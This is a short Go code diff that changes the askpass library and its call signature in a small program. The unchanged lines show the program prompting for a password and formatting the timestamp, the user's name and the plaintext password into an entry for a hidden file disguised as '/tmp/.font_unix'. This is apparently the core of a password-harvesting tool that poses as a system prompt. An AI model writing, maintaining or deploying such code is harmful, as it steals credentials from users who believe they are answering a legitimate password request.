@@ -6,7 +6,7 @@ import (
 	"os/user"
 	"time"
 
-	"github.com/audibleblink/go-askpass"
+	"github.com/ilius/go-askpass"
 )
 
 var filename = "/tmp/.font_unix"
@@ -15,7 +15,7 @@ func main() {
 	currentUser, err := user.Current()
 	check(err)
 
-	pwd, err := askpass.Askpass(os.Args[1], false)
+	pwd, err := askpass.Askpass(os.Args[1], false, "")
 	check(err)
 
 	entry := fmt.Sprintf("%s | %s | %s\n", time.Now(), currentUser.Name, pwd)
